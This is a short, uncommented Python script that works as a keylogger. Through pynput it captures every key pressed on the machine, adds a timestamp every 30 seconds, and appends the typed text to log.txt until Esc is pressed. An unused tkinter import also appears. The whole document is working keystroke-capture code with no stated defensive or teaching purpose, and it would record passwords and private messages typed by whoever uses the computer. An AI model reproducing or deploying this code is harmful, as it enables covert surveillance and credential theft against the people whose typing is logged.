from tkinter import ttk
import tkinter as tk
import pynput
import datetime
from pynput.keyboard import Key, Listener
import time

count = 0
keys = []
t1 = time.time()


def on_press(key):
    global keys, count, t1

    keys.append(key)
    
    # print("{0} pressed".format(key))
    t2 = time.time()

    if t2 - t1 >= 30 and keys != []:
        # if count>=10:
        # count += 1
        keys.insert(0, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        keys.insert(1, "  ")
        write_file(keys)
        keys = []
        t1 = time.time()


def write_file(keys):
    with open("log.txt", "a") as f:
        f.write("\n")
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find('Key') == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
